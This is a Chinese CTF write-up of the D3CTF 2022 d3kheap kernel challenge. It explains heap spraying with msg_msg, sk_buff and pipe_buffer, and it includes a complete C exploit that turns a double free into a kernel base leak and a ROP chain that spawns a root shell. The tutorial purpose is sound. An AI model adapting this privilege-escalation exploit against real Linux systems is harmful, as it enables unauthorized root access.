# 利用msg-msg结构体进行提权

> 原文: https://www.ctfiot.com/75106.html
> ID: 75106

现实场景中的漏洞比CTF题目更难以利用，通常只有一个UAF，Linux内核中UAF漏洞占比相对较高。我们考虑一种现实场景：在保护全开的情况下，若是给一个内核空间中的double free，大小为xxx，该如何进行利用完成提权？本文会使用一道CTF题目进行分析，使用堆喷的方式，msg_msg配合sk_buff、pipe_buffer等结构完成权限提升。

一

题目介绍

题目来自2022 D3CTF 一道内核PWN，名称为d3kheap（题目下载链接附在文末）。

和常规内核题目类似，在rootfs中有ko模块，可以使用`cpio -idmv`解包后提取出文件系统。将ko模块提取出来后，放到IDA中分析逻辑，可以明显的看到一个UAF。`ioctl`的请求码0x1234和0xdead分别对应分配和释放，但是我们只能使用一次分配功能便无法使用，并且大小是固定的1024，释放的时候可以释放两次，那么这就满足了double free的漏洞条件。具体逻辑如下图：

基于程序逻辑，现在有了一个构造UAF的思路：

1. 首先用分配功能分配一个1024大小的内存，这里就称它为kheap

2. 0xdead功能释放kheap，此时kheap被挂在free list链表上，由内核进行管理

3. 此时我们应该去调用一个函数，这个函数它会在内核中会分配一块它所用到的结构体大小的内存，如果这个堆块大小刚好等于kheap的大小，那么由于LIFO的原则，极大可能将kheap重新申请出来。此时我们还可以对kheap进行一次释放，那么就构成了一个UAF

关键在于我们应该调用哪个函数？应该使用什么结构体？并且这个结构体大小刚好会分配1024，而且便于我们利用？答案就是`msg_msg`结构体，这个结构体由`msgsnd`和`msgrcv`系统调用来分配和回收，大小是可控的，0x30~0x1000之间都可以进行分配，很容易满足我们的要求。

二

msg_msg结构体的分配和回收

接下来需要了解一下msg_msg结构体它分配和回收的过程。简单介绍一下msg_msg相关函数：

第一个成员m_list其实就是俩指针组成的结构体，一个next，一个prev，总共占用两个字长，其实对链表熟悉的话一看就知道是个链表。msg_msg这个结构体算下来总共占用0x30字节，这其实就是msgsnd和msgrcv操作的消息头，消息头之后的内容才是用户消息内容。其中我们要利用的是m_ts成员，它存储用户消息长度，如何利用稍后会讲。

msg_msg结构体有一个特性：

第一部分消息头中的next成员保存这片内存的指针，形成一个单链表。如下图：

– 消息结构体大小最大值由/proc/sys/kernel/msgmax确定，默认是8192，所以默认最多链接3个成员

综合以上信息，现在有了另一个思路：

首先想到的是，我们在分配msg_msg的时候，可以控制它的大小刚好为0x400，然后分配到我们的kheap上做一些其他操作。但是仔细想想就知道不行，因为msg_msg头部我们不可控，也没有办法进行修改。另外一种操作就是我们分配超出一页大小的msg_msg结构，那么此时`next`指向另外一部分我们的数据内容，另一部分由于没有0x30的消息头，所以是我们可控的，这样的话我们只要控制好msg_msg的大小，让他超出一页后，另一部分刚好等于1024大小，就会把kheap分配回去。

但是，msg_msg结构存储的几个成员只能泄露堆地址，不足以泄露内核基址，所以我们还需要另外想一些办法，找到一些存储内核地址的结构体，占用释放掉的msg_msg后把它读出来完成泄露。

三

sk_buff结构体利用

sk_buff是Linux内核网络协议栈用到的结构体，它可以表示网络协议栈传输的一个包，但他本身不包含数据部分，数据存储在一个单独的对象中。定义在 include/linux/skbuff.h中，由于结构体比较复杂，这里取关健的成员进行展示：

struct sk_buff {
 union {
  struct {
   /* These two members must be first. */
   struct sk_buff  *next;
   struct sk_buff  *prev;

   // ...
 };

 // ...

 /* These elements must be at the end, see alloc_skb() for details.  */
 sk_buff_data_t  tail;
 sk_buff_data_t  end;
 unsigned char  *head,
    *data;
 unsigned int  truesize;
 refcount_t  users;

#ifdef CONFIG_SKB_EXTENSIONS
 /* only useable after checking ->active_extensions != 0 */
 struct skb_ext  *extensions;
#endif
};

sk_buff结构体与其所表示的数据包形成如下结构，其中：

– head ：一个数据包实际的起始处（也就是为该数据包分配的 object 的首地址）

– end ：一个数据包实际的末尾（为该数据包分配的 object 的末尾地址）

– data ：当前所在 layer 的数据包对应的起始地址

– tail ：当前所在 layer 的数据包对应的末尾地址

多个sk_buff形成双链表结构，类似于上面的msg队列。sk_buff中存在skb_shared_info结构体，定义在 include/linux/skbuff.h 中，它占用320字节，这意味着我们在进行构造的时候最小也需要是512大小的堆块。

最简单的方式就是使用socketpair系统调用来创建一对socket，通过read和write函数向socketpair读取或写入来控制分配、释放sk_buff。利用这个结构体其实跟msg_msg效果类似，只是sk_buff更像是一个“菜单堆”，方便分配和释放。

三

pipe_buffer结构体

当我们创建一个管道时，在内核中会生成数个连续的 pipe_buffer 结构体，申请的内存总大小刚好会让内核从 kmalloc-1k 中取出一个 object，结构体定义于 includ/linux/pipe_fs_i.h 中：

其中 pipe_buf_operations 成员通常指向一张全局函数表，因此可以用于泄露内核代码段地址。定义如下：

四

利用思路

综合以上信息，对利用过程进行梳理：

1. 首先做一些初始化工作

2. 使用分配功能分配一个堆块kheap，堆喷msg_msg结构体，中途释放kheap，保证后面分配的msg_msg结构体占用这块内存

3. 第二次释放kheap，然后堆喷sk_buff结构体，使用msgrcv读取所有socketpair，可设置MSG_COPY标志位防止unlink而导致的内核崩溃。由于msg_msg结构体被改变，当msgrcv失败时表示命中kheap，然后释放掉所有的sk_buff，让kheap重新进入free list

4. 再次堆喷sk_buff结构体，修改m_ts的值，根据m_ts的大小进行读取时，则会发生越界访问

5. 伪造msg_msg-> next成员，达到任意地址读取

6. 有了任意地址读取后喷射pipe_buffer，读出pipe_buf_operations，泄露内核基址。

7. 最后劫持pipe_buf_operations -> release函数指针，完成控制流劫持，构造ROP提权，返回用户态起shell

五

构造利用脚本

一、首先我们做一些初始化工作，保存用户态寄存器，绑定单核，创建socketpair，并打开设备文件：

二、接下来创建msg_msg消息队列，使用模块分配功能分配一个0x400大小的堆块，然后我们喷射0x60和0x400大小的消息结构，在中途使用一次释放功能，使后续0x400消息结构能占用这块内存：

现在内存视图如下：

3. 接下来我们进行第二次释放，释放掉kheap：

4.然后构造假的msg_msg结构体，将`m_ts`成员设置为0x400，使用sk_buff堆喷占用kheap，那么我就可以修改原本的msg_msg结构。这里注意一下sk_buff的大小，由于sk_buff自带320字节的内容，所以我们要构造1024的话，消息内容就是1024-320=704字节。

5.然后我们释放掉所有申请的sk_buff，其主要目的是使kheap进入free list，方便后续我们再次申请回来进行写入。这部分代码如下：

6.我们再次把kheap分配回来，为了提高分配成功率，还是使用堆喷sk_buff的方式。这次我们要修改掉msg_msg的m_ts成员为0x1000，很明显，在操作msg_msg结构时会发生越界访问，因为原来的msg_msg ->m_ts是0x400，被我们改为了0x1000。

7.改完m_ts后就可以读取内核数据到用户态了，会发生越界访问。那么只要判断我们标记的tag，就可以知道是否命中UAF的堆块，这时候直接在oob_msg中查找我们想要的数据即可。代码如下：

8.现在有了这个内核堆地址，其实也就是msg_msg中的链表地址，那么我们就可以再次释放，然后去伪造一个msg_msg结构体，伪造一个超出0x1000大小的结构，构造m_ts成员和next成员，next指针指向第二部分消息内容。

9.下面开始修复msg_msg结构体，使它链到我们指定的堆块上，并修复m_ts大小为0x400，然后释放掉msg_msg结构体，但我们仍然可以通过sk_buff来对它进行操作。

10.之后喷射pipe_buffer结构体，命中kheap之后，再用把sk_buff读出来，就得到了pipe_buffer结构体的内容，可以根据pipe_buffer -> ops成员算出内核基址：

11.有了内核基址后，构造pipe_buffer->ops，劫持release函数，完成控制流劫持，最后构造ROP栈迁移，返回用户态起shel。

六

完整利用脚本

#define _GNU_SOURCE
#include <err.h>
#include <errno.h>
#include <fcntl.h>
#include <inttypes.h>
#include <sched.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <sys/ipc.h>
#include <sys/msg.h>
#include <sys/socket.h>
#include <sys/syscall.h>

#define PRIMARY_MSG_SIZE 96
#define SECONDARY_MSG_SIZE 0x400

#define PRIMARY_MSG_TYPE    0x41
#define SECONDARY_MSG_TYPE  0x42
#define VICTIM_MSG_TYPE     0x1337
#define MSG_TAG     0xAAAAAAAA

#define SOCKET_NUM 16
#define SK_BUFF_NUM 128
#define PIPE_NUM 256
#define MSG_QUEUE_NUM 4096

#define OBJ_ADD     0x1234
#define OBJ_EDIT    0x4321
#define OBJ_SHOW  0xbeef
#define OBJ_DEL     0xdead

#define PREPARE_KERNEL_CRED 0xffffffff810d2ac0
#define INIT_CRED 0xffffffff82c6d580
#define COMMIT_CREDS 0xffffffff810d25c0
#define SWAPGS_RESTORE_REGS_AND_RETURN_TO_USERMODE 0xffffffff81c00ff0
#define POP_RDI_RET 0xffffffff810938f0
#define ANON_PIPE_BUF_OPS 0xffffffff8203fe40
#define FREE_PIPE_INFO 0xffffffff81327570
#define POP_R14_POP_RBP_RET 0xffffffff81003364
#define PUSH_RSI_POP_RSP_POP_4VAL_RET 0xffffffff812dbede
#define CALL_RSI_PTR 0xffffffff8105acec

size_t user_cs, user_ss, user_sp, user_rflags;
size_t kernel_offset, kernel_base = 0xffffffff81000000;
size_t prepare_kernel_cred, commit_creds, swapgs_restore_regs_and_return_to_usermode, init_cred;

long dev_fd;
int pipe_fd[2], pipe_fd2[2], pipe_fd_1;

/*
 * skb_shared_info 会携带320字节的头信息，所以大小是：
 * 1024 - 320 = 704
 */
char fake_secondary_msg[704];

void add(void)
{
    ioctl(dev_fd, OBJ_ADD);
}

void del(void)
{
    ioctl(dev_fd, OBJ_DEL);
}

size_t user_cs, user_ss, user_sp, user_rflags;

// 保存用户态寄存器，退出内核态时使用
void saveStatus()
{
    __asm__("mov user_cs, cs;"
            "mov user_ss, ss;"
            "mov user_sp, rsp;"
            "pushf;"
            "pop user_rflags;"
            );
    printf(" 33[34m 33[1m[*] Status has been saved. 33[0mn");
}

// 链表结构
struct list_head
{
    uint64_t    next;
    uint64_t    prev;
};

// msg_msg 信息头部结构体
struct msg_msg
{
    struct list_head m_list;
    uint64_t    m_type;
    uint64_t    m_ts;
    uint64_t    next;
    uint64_t    security;
};

// msg_msg 超出0x1000的部分不包含头部信息，而是一个next指针
struct msg_msgseg
{
    uint64_t    next;
};

// 主消息大小0x60
struct 
{
    long mtype;
    char mtext[PRIMARY_MSG_SIZE - sizeof(struct msg_msg)];
}primary_msg;

// 副消息大小0x400
struct 
{
    long mtype;
    char mtext[SECONDARY_MSG_SIZE - sizeof(struct msg_msg)];
}secondary_msg;

// 占用两页大小来读取存在的数据
struct
{
    long mtype;
    char mtext[0x1000 - sizeof(struct msg_msg) + 0x1000 - sizeof(struct msg_msgseg)];
} oob_msg;

// pipe_buffer 结构体照着源码搬运过来
struct pipe_buffer
{
    uint64_t    page;
    uint32_t    offset, len;
    uint64_t    ops;
    uint32_t    flags;
    uint32_t    padding;
    uint64_t    private;
};

// 包含四个函数指针的结构体，照着源码搬运过来
struct pipe_buf_operations
{
    uint64_t    confirm;
    uint64_t    release;
    uint64_t    try_steal;
    uint64_t    get;
};

void errExit(char *msg)
{
    printf(" 33[31m 33[1m[x] Error: %s 33[0mn", msg);
    exit(EXIT_FAILURE);
}

// msgrcv接收消息，从内核复制消息到用户，参数2是用户数据区，最后会调用free_msg释放消息
int readMsg(int msqid, void *msgp, size_t msgsz, long msgtyp)
{
    return msgrcv(msqid, msgp, msgsz - sizeof(long), msgtyp, 0);
}

// msgsnd发送消息，将用户数据发送到内核
int writeMsg(int msqid, void *msgp, size_t msgsz, long msgtyp)
{
    *(long*)msgp = msgtyp;
    return msgsnd(msqid, msgp, msgsz - sizeof(long), 0);
}

// msgrcv接受消息，加上MSG_COPY标志的话，读取过的内核数据区不会被unlink
int peekMsg(int msqid, void *msgp, size_t msgsz, long msgtyp)
{
    return msgrcv(msqid, msgp, msgsz - sizeof(long), msgtyp, MSG_COPY | IPC_NOWAIT);
}

// 构造msg_msg结构，向参数1结构体赋值
void buildMsg(struct msg_msg *msg, uint64_t m_list_next,
    uint64_t m_list_prev, uint64_t m_type, uint64_t m_ts, 
    uint64_t next, uint64_t security)
{
    msg->m_list.next = m_list_next;
    msg->m_list.prev = m_list_prev;
    msg->m_type = m_type;
    msg->m_ts = m_ts;
    msg->next = next;
    msg->security = security;
}

// 喷射sk_buff结构，他附带一个skb_shared_info结构体。向socketpair写来达到分配的目的，喷射大小为0x400，每个socketpair喷射128次
int spraySkBuff(int sk_socket[SOCKET_NUM][2], void *buf, size_t size)
{
    for (int i = 0; i < SOCKET_NUM; i++)
        for (int j = 0; j < SK_BUFF_NUM; j++)
        {
            // printf("[-] now %d, num %dn", i, j);
            if (write(sk_socket[i][0], buf, size) < 0)
                return -1;
        }
    return 0;
}

// 释放sk_buff结构，向socketpair读来达到释放的目的
int freeSkBuff(int sk_socket[SOCKET_NUM][2], void *buf, size_t size)
{
    for (int i = 0; i < SOCKET_NUM; i++)
        for (int j = 0; j < SK_BUFF_NUM; j++)
            if (read(sk_socket[i][1], buf, size) < 0)
                return -1;
    return 0;
}

// 用户态起shell
void getRootShell(void)
{
    if (getuid())
        errExit("failed to gain the root!");
    
    printf(" 33[32m 33[1m[+] Succesfully gain the root privilege, trigerring root shell now... 33[0mn");
    system("/bin/sh");
}

int main(int argc, char **argv, char **envp)
{
    int         oob_pipe_fd[2];
    int         sk_sockets[SOCKET_NUM][2];
    int         pipe_fd[PIPE_NUM][2];
    int         msqid[MSG_QUEUE_NUM];
    int         victim_qid, real_qid;
    struct msg_msg  *nearby_msg;
    struct msg_msg  *nearby_msg_prim;
    struct pipe_buffer *pipe_buf_ptr;
    struct pipe_buf_operations *ops_ptr;
    uint64_t    victim_addr;
    uint64_t    kernel_base;
    uint64_t    kernel_offset;
    uint64_t    *rop_chain;
    int         rop_idx;
    cpu_set_t   cpu_set;

    saveStatus();

    /*
     * Step.O
     * 初始化
     */

    // 绑定单核
    CPU_ZERO(&cpu_set);
    CPU_SET(0, &cpu_set);
    sched_setaffinity(getpid(), sizeof(cpu_set), &cpu_set);
    
    // 创建16对socketpair，描述符存在sk_sockets数组中
    for (int i = 0; i < SOCKET_NUM; i++)
        if (socketpair(AF_UNIX, SOCK_STREAM, 0, sk_sockets[i]) < 0)
            errExit("failed to create socket pair!");
    
    dev_fd = open("/dev/d3kheap", O_RDONLY);

    /*
     * Step.1
     * msgget 创建 msg 队列
     * 使用模块功能添加一个0x400大小堆块
     * 喷射msg_msg结构，每次都发送两条消息，一条0x60大小，另一条0x400大小
     * 当循环到中途时释放掉之前添加的0x400，之后msgsnd时有极大几率分配到此chunk
     */

    // 创建4096个消息队列
    for (int i = 0; i < MSG_QUEUE_NUM; i++)
    {
        if ((msqid[i] = msgget(IPC_PRIVATE, 0666 | IPC_CREAT)) < 0)
            errExit("failed to create msg_queue!");
    }

    // 初始化主消息和副消息
    memset(&primary_msg, 0, sizeof(primary_msg));
    memset(&secondary_msg, 0, sizeof(secondary_msg));

    // 使用模块功能分配0x400堆块
    add();

    // 喷射0x60和0x400堆块，在中途释放掉模块申请的0x400,使后续的副消息堆块进行占用，那么这个堆块内容就是我们可控的了
    for (int i = 0; i < MSG_QUEUE_NUM; i++)
    {
        *(int *)&primary_msg.mtext[0] = MSG_TAG;
        *(int *)&primary_msg.mtext[4] = i;
        if (writeMsg(msqid[i], &primary_msg, 
                sizeof(primary_msg), PRIMARY_MSG_TYPE) < 0)
            errExit("failed to send primary msg!");

        *(int *)&secondary_msg.mtext[0] = MSG_TAG;
        *(int *)&secondary_msg.mtext[4] = i;
        if (writeMsg(msqid[i], &secondary_msg, 
                sizeof(secondary_msg), SECONDARY_MSG_TYPE) < 0)
            errExit("failed to send secondary msg!");
        
        if (i == 1024)
            del();
    }

    /*
     * Step.2
     * 再次释放这个可控堆块，让它进入free list,
     * 然后我们构造一个假的msg_msg结构体，把m_ts成员设置成0x400，它其实就是大小，其他的随意
     * 接下来再次喷射sk_buff，让sk_buff占用，并将我们构造的msg_msg写入到刚才释放的堆块中
     */

    del();

    // 喷射sk_buff，使用sk_buff占用这个被释放的0x400堆块，并写入一个构造好的msg_msg结构
    puts("[*] spray sk_buff...");
    buildMsg((struct msg_msg *)fake_secondary_msg, 
            *(uint64_t*)"unr4v31.", *(uint64_t*)"unr4v31.", 
            *(uint64_t*)"unr4v31.", SECONDARY_MSG_SIZE, 0, 0);

    if (spraySkBuff(sk_sockets, fake_secondary_msg, 
            sizeof(fake_secondary_msg)) < 0)
        errExit("failed to spray sk_buff!");

    // 使用msgrcv来读取所有的msg队列中的内容，并添加MSG_COPY标识位，避免unlink时错误的链表指针导致内核崩溃
    victim_qid = -1;
    for (int i = 0; i < MSG_QUEUE_NUM; i++)
    {
        // 由于我们修改过msg_msg结构体，所以它无法被读取出来，利用这一点可以判断出我们命中队列的下标
        if (peekMsg(msqid[i], &secondary_msg, sizeof(secondary_msg), 1) < 0)
        {
            printf("[+] victim qid: %dn", i);
            victim_qid = i;
        }
    }

    if (victim_qid == -1)
        errExit("failed to make the UAF in msg queue!");

    // 然后释放掉sk_buff
    if (freeSkBuff(sk_sockets, fake_secondary_msg, 
            sizeof(fake_secondary_msg)) < 0)
        errExit("failed to release sk_buff!");
    

    /*
     * Step.3
     * 接下来我们要重新把这些堆块申请回来，修改它们的m_ts成员为0x1000-0x30，这样就可以刚好申请到一页大小
     * 有了m_ts成员之后，我们就可以通过它来进行越界读取，找出堆喷命中的UAF堆块
     */

    buildMsg((struct msg_msg *)fake_secondary_msg, 
            *(uint64_t*)"unr4v31.", *(uint64_t*)"unr4v31.", 
            VICTIM_MSG_TYPE, 0x1000 - sizeof(struct msg_msg), 0, 0);
    if (spraySkBuff(sk_sockets, fake_secondary_msg, 
            sizeof(fake_secondary_msg)) < 0)
        errExit("failed to spray sk_buff!");
    
    // oob_msg读取的数据会保存到oob_msg
    if (peekMsg(msqid[victim_qid], &oob_msg, sizeof(oob_msg), 1) < 0)
        errExit("failed to read victim msg!");

    if (*(int *)&oob_msg.mtext[SECONDARY_MSG_SIZE] != MSG_TAG)
        errExit("failed to rehit the UAF object!");

    nearby_msg = (struct msg_msg*) 
            &oob_msg.mtext[(SECONDARY_MSG_SIZE) - sizeof(struct msg_msg)];
    
    printf(" 33[32m 33[1m[+] addr of primary msg of msg nearby victim:  33[0m%llxn", 
            nearby_msg->m_list.prev);

    if (freeSkBuff(sk_sockets, fake_secondary_msg, 
            sizeof(fake_secondary_msg)) < 0)
        errExit("failed to release sk_buff!");
    
    buildMsg((struct msg_msg *)fake_secondary_msg, 
            *(uint64_t*)"unr4v31.", *(uint64_t*)"unr4v31.", 
            VICTIM_MSG_TYPE, sizeof(oob_msg.mtext), 
            nearby_msg->m_list.prev - 8, 0);
    if (spraySkBuff(sk_sockets, fake_secondary_msg, 
            sizeof(fake_secondary_msg)) < 0)
        errExit("failed to spray sk_buff!");
    
    if (peekMsg(msqid[victim_qid], &oob_msg, sizeof(oob_msg), 1) < 0)
        errExit("failed to read victim msg!");
    
    if (*(int *)&oob_msg.mtext[0x1000] != MSG_TAG)
        errExit("failed to rehit the UAF object!");
    
    // cal the addr of UAF obj by the header we just read out
    nearby_msg_prim = (struct msg_msg*) 
            &oob_msg.mtext[0x1000 - sizeof(struct msg_msg)];
    victim_addr = nearby_msg_prim->m_list.next - 0x400;
    
    printf(" 33[32m 33[1m[+] addr of msg next to victim:  33[0m%llxn", 
            nearby_msg_prim->m_list.next);
    printf(" 33[32m 33[1m[+] addr of msg UAF object:  33[0m%llxn", victim_addr);

    /*
     * Step.4
     * 修复msg_msg结构体，释放后喷射pipe_buffer结构体，泄露内核地址
     */

    if (freeSkBuff(sk_sockets, fake_secondary_msg, 
            sizeof(fake_secondary_msg)) < 0)
        errExit("failed to release sk_buff!");
    
    memset(fake_secondary_msg, 0, sizeof(fake_secondary_msg));
    buildMsg((struct msg_msg *)fake_secondary_msg, 
            victim_addr + 0x800, victim_addr + 0x800, // a valid kheap addr is valid
            VICTIM_MSG_TYPE, SECONDARY_MSG_SIZE - sizeof(struct msg_msg), 
            0, 0);
    if (spraySkBuff(sk_sockets, fake_secondary_msg, 
            sizeof(fake_secondary_msg)) < 0)
        errExit("failed to spray sk_buff!");
    
    // 释放msg_msg结构
    if (readMsg(msqid[victim_qid], &secondary_msg, 
                sizeof(secondary_msg), VICTIM_MSG_TYPE) < 0)
        errExit("failed to receive secondary msg!");
    
    // 喷射pipe_buffer
    for (int i = 0; i < PIPE_NUM; i++)
    {
        if (pipe(pipe_fd[i]) < 0)
            errExit("failed to create pipe!");
        
        // write something to activate it
        if (write(pipe_fd[i][1], "unr4v31.", 8) < 0)
            errExit("failed to write the pipe!");
    }

    // 读取sk_buff，也是pipe_buffer结构体，这里直接用read会释放掉所有的sk_buff，方便后续再次分配进行写入
    pipe_buf_ptr = (struct pipe_buffer *) &fake_secondary_msg;
    for (int i = 0; i < SOCKET_NUM; i++)
    {
        for (int j = 0; j < SK_BUFF_NUM; j++)
        {
            if (read(sk_sockets[i][1], &fake_secondary_msg, 
                    sizeof(fake_secondary_msg)) < 0)
                errExit("failed to release sk_buff!");
            
            if (pipe_buf_ptr->ops > 0xffffffff81000000)
            {
                printf(" 33[32m 33[1m[+] got anon_pipe_buf_ops:  33[0m%llxn", 
                        pipe_buf_ptr->ops);
                kernel_offset = pipe_buf_ptr->ops - ANON_PIPE_BUF_OPS;
                kernel_base = 0xffffffff81000000 + kernel_offset;
            }
        }
    }

    printf(" 33[32m 33[1m[+] kernel base:  33[0m%llx  33[32m 33[1moffset:  33[0m%llxn", 
            kernel_base, kernel_offset);
    
    /*
     * Step.5
     * 劫持pipe_buffer中的ops，释放所有的pipe_buffer来触发release函数，这样就完成控制流劫持
     */

    pipe_buf_ptr = (struct pipe_buffer *) fake_secondary_msg;
    pipe_buf_ptr->page = *(uint64_t*) "unr4v31.";
    pipe_buf_ptr->ops = victim_addr + 0x100;

    ops_ptr = (struct pipe_buf_operations *) &fake_secondary_msg[0x100];
    ops_ptr->release = PUSH_RSI_POP_RSP_POP_4VAL_RET + kernel_offset;

    rop_idx = 0;
    rop_chain = (uint64_t*) &fake_secondary_msg[0x20];
    rop_chain[rop_idx++] = kernel_offset + POP_RDI_RET;
    rop_chain[rop_idx++] = kernel_offset + INIT_CRED;
    rop_chain[rop_idx++] = kernel_offset + COMMIT_CREDS;
    rop_chain[rop_idx++] = kernel_offset + SWAPGS_RESTORE_REGS_AND_RETURN_TO_USERMODE + 22;
    rop_chain[rop_idx++] = *(uint64_t*) "unr4v31.";
    rop_chain[rop_idx++] = *(uint64_t*) "unr4v31.";
    rop_chain[rop_idx++] = getRootShell;
    rop_chain[rop_idx++] = user_cs;
    rop_chain[rop_idx++] = user_rflags;
    rop_chain[rop_idx++] = user_sp;
    rop_chain[rop_idx++] = user_ss;

    puts("[*] spray sk_buff to hijack pipe_buffer...");
    if (spraySkBuff(sk_sockets, fake_secondary_msg, 
            sizeof(fake_secondary_msg)) < 0)
        errExit("failed to spray sk_buff!");
    
    // for gdb attach only
    printf("[*] gadget: %pn", kernel_offset + PUSH_RSI_POP_RSP_POP_4VAL_RET);
    printf("[*] free_pipe_info: %pn", kernel_offset + FREE_PIPE_INFO);
    sleep(5);

    puts("[*] trigger fake ops->release to hijack RIP...");
    for (int i = 0; i < PIPE_NUM; i++)
    {
        close(pipe_fd[i][0]);
        close(pipe_fd[i][1]);
    }
}

七

总结

通过以上分析，对msg_msg结构体有了了解：此结构体大小范围比较宽泛，是一个非常好用的结构体，它可以配合其他的结构体完成提权，并且在此过程中学习了内核利用中常用到的堆喷技术。另外，2022网鼎杯玄武组有两道内核PWN也是如出一辙，都是考察msg_msg相关利用。

八

Reference

【d3kheap下载链接】https://github.com/arttnba3/D3CTF2022_d3kheap

【D^ 3CTF2022 d3kheap 出题手记】https://arttnba3.cn/2022/03/08/CTF-0X06-D3CTF2022_D3KHEAP/

【Linux内核中利用msg_msg结构实现任意地址读写】https://blog.csdn.net/panhewu9919/article/details/120820617?spm=1001.2014.3001.5502


```
/* one msg_msg structure for each message */
struct msg_msg {
 struct list_head m_list;
 long m_type;
 size_t m_ts;  /* message text size */
 struct msg_msgseg *next;
 void *security;
 /* the actual message follows immediately */
};
```



```
struct msg_msgseg {
 struct msg_msgseg *next;
 /* the next part of the message follows immediately */
};
```



```
struct sk_buff {
 union {
  struct {
   /* These two members must be first. */
   struct sk_buff  *next;
   struct sk_buff  *prev;

   // ...
 };

 // ...

 /* These elements must be at the end, see alloc_skb() for details.  */
 sk_buff_data_t  tail;
 sk_buff_data_t  end;
 unsigned char  *head,
    *data;
 unsigned int  truesize;
 refcount_t  users;

#ifdef CONFIG_SKB_EXTENSIONS
 /* only useable after checking ->active_extensions != 0 */
 struct skb_ext  *extensions;
#endif
};
```



```
struct pipe_buffer {
 struct page *page;
 unsigned int offset, len;
 const struct pipe_buf_operations *ops;
 unsigned int flags;
 unsigned long private;
};
```



```
struct pipe_buf_operations {
 int (*confirm)(struct pipe_inode_info *, struct pipe_buffer *);
 void (*release)(struct pipe_inode_info *, struct pipe_buffer *);
 bool (*try_steal)(struct pipe_inode_info *, struct pipe_buffer *);
 bool (*get)(struct pipe_inode_info *, struct pipe_buffer *);
};
```



```
#define SOCKET_NUM 16

size_t user_cs, user_ss, user_sp, user_rflags;
// 保存用户态寄存器，退出内核态时使用
void saveStatus()
{
    __asm__("mov user_cs, cs;"
            "mov user_ss, ss;"
            "mov user_sp, rsp;"
            "pushf;"
            "pop user_rflags;"
            );
    printf(" 33[34m 33[1m[*] Status has been saved. 33[0mn");
}

long dev_fd;
int main(int argc, char **argv, char **envp)
{

  cpu_set_t   cpu_set;
  int         sk_sockets[SOCKET_NUM][2];

  // 绑定单核
    CPU_ZERO(&cpu_set);
    CPU_SET(0, &cpu_set);
    sched_setaffinity(getpid(), sizeof(cpu_set), &cpu_set);

  // 创建16对socketpair，描述符存在sk_sockets数组中
    for (int i = 0; i < SOCKET_NUM; i++)
        if (socketpair(AF_UNIX, SOCK_STREAM, 0, sk_sockets[i]) < 0)
            errExit("failed to create socket pair!");
    
    dev_fd = open("/dev/d3kheap", O_RDONLY);
}
```



```
#define MSG_QUEUE_NUM 4096
#define PRIMARY_MSG_SIZE 96
#define SECONDARY_MSG_SIZE 0x400
#define MSG_TAG     0xAAAAAAAA

#define OBJ_ADD     0x1234
#define OBJ_DEL     0xdead

// 链表结构
struct list_head
{
    uint64_t    next;
    uint64_t    prev;
};

// msg_msg 信息头部结构体
struct msg_msg
{
    struct list_head m_list;
    uint64_t    m_type;
    uint64_t    m_ts;
    uint64_t    next;
    uint64_t    security;
};

// 主消息大小0x60
struct 
{
    long mtype;
    char mtext[PRIMARY_MSG_SIZE - sizeof(struct msg_msg)];
}primary_msg;

// 副消息大小0x400
struct 
{
    long mtype;
    char mtext[SECONDARY_MSG_SIZE - sizeof(struct msg_msg)];
}secondary_msg;

// 错误处理函数
void errExit(char *msg)
{
    printf(" 33[31m 33[1m[x] Error: %s 33[0mn", msg);
    exit(EXIT_FAILURE);
}

// msgsnd发送消息，将用户数据发送到内核
int writeMsg(int msqid, void *msgp, size_t msgsz, long msgtyp)
{
    *(long*)msgp = msgtyp;
    return msgsnd(msqid, msgp, msgsz - sizeof(long), 0);
}

void add(void)
{
    ioctl(dev_fd, OBJ_ADD);
}

void del(void)
{
    ioctl(dev_fd, OBJ_DEL);
}

int main(int argc, char **argv, char **envp)
{
  ......

  int         msqid[MSG_QUEUE_NUM];
  
  /*
     * Step.1
     * msgget 创建 msg 队列
     * 使用模块功能添加一个0x400大小堆块
     * 喷射msg_msg结构，每次都发送两条消息，一条0x60大小，另一条0x400大小
     * 当循环到中途时释放掉之前添加的0x400，之后msgsnd时有极大几率分配到此chunk
     */

    // 创建4096个消息队列
    for (int i = 0; i < MSG_QUEUE_NUM; i++)
    {
        if ((msqid[i] = msgget(IPC_PRIVATE, 0666 | IPC_CREAT)) < 0)
            errExit("failed to create msg_queue!");
    }

    // 初始化主消息和副消息
    memset(&primary_msg, 0, sizeof(primary_msg));
    memset(&secondary_msg, 0, sizeof(secondary_msg));

    // 使用模块功能分配0x400堆块
    add();

    // 喷射0x60和0x400堆块，在中途释放掉模块申请的0x400,使后续的副消息堆块进行占用，那么这个堆块内容就是我们可控的了
    for (int i = 0; i < MSG_QUEUE_NUM; i++)
    {
        *(int *)&primary_msg.mtext[0] = MSG_TAG;
        *(int *)&primary_msg.mtext[4] = i;
        if (writeMsg(msqid[i], &primary_msg, 
                sizeof(primary_msg), PRIMARY_MSG_TYPE) < 0)
            errExit("failed to send primary msg!");

        *(int *)&secondary_msg.mtext[0] = MSG_TAG;
        *(int *)&secondary_msg.mtext[4] = i;
        if (writeMsg(msqid[i], &secondary_msg, 
                sizeof(secondary_msg), SECONDARY_MSG_TYPE) < 0)
            errExit("failed to send secondary msg!");
        
        if (i == 1024)
            del();
    }
}
```



```
#define SK_BUFF_NUM 128

char fake_secondary_msg[704];
// 构造msg_msg结构，向参数1结构体赋值
void buildMsg(struct msg_msg *msg, uint64_t m_list_next,
    uint64_t m_list_prev, uint64_t m_type, uint64_t m_ts, 
    uint64_t next, uint64_t security)
{
    msg->m_list.next = m_list_next;
    msg->m_list.prev = m_list_prev;
    msg->m_type = m_type;
    msg->m_ts = m_ts;
    msg->next = next;
    msg->security = security;
}

// msgrcv接受消息，加上MSG_COPY标志的话，读取过的内核数据区不会被unlink
int peekMsg(int msqid, void *msgp, size_t msgsz, long msgtyp)
{
    return msgrcv(msqid, msgp, msgsz - sizeof(long), msgtyp, MSG_COPY | IPC_NOWAIT);
}

// 释放sk_buff结构，向socketpair读来达到释放的目的
int freeSkBuff(int sk_socket[SOCKET_NUM][2], void *buf, size_t size)
{
    for (int i = 0; i < SOCKET_NUM; i++)
        for (int j = 0; j < SK_BUFF_NUM; j++)
            if (read(sk_socket[i][1], buf, size) < 0)
                return -1;
    return 0;
}

// 喷射sk_buff结构，他附带一个skb_shared_info结构体。向socketpair写来达到分配的目的，喷射大小为0x400，每个socketpair喷射128次
